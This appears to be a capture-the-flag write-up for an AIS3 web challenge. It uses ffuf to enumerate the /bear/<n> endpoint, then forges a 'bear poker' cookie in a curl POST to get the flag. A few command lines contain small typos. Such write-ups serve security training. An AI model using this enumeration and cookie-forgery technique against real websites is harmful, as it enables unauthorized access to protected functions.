1. Different `n` in `/bear/<n>` shows different bear, so we can try to query all the bears.

```
$ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt
$ vim ./fuzz_bear.txt  # copy ffuf output to file

$ grep -v 'Size: 1358 ./fuzz_bear.txt
5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]

$ curl http://chals1.ais3.org:8987/bear/499  # 499 is the SECRET BEAR
Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
```

2. We need to be a `bear poker`. Looks like it's refering to the cookie.

```
$ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
<script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
```

Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`
